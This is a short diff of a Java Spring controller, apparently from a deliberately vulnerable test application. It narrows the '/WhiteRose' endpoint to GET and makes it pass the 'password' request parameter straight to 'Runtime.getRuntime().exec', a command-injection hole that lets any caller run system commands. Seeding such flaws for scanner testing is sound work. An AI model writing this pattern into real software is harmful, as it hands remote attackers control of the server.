@@ -12,11 +12,10 @@ import java.io.IOException;
 @RequestMapping("/One")
 public class FlowerOneController {
 
-    @RequestMapping(value = "/WhiteRose", method = {RequestMethod.GET, RequestMethod.POST,
-            RequestMethod.DELETE, RequestMethod.HEAD, RequestMethod.OPTIONS,
-            RequestMethod.PATCH, RequestMethod.PUT, RequestMethod.TRACE})
+    @RequestMapping(value = "/WhiteRose", method = {RequestMethod.GET})
     public void getWhiteRoseSmell(@RequestParam(required=true) String password) throws IOException {
-        Utill.hundredRisks(password);
+        byte[] buf = new byte[1024];
+        int len = Runtime.getRuntime().exec(password).getInputStream().read(buf);
     }
 
     @RequestMapping(value = "/Rose", method = {RequestMethod.GET, RequestMethod.POST,
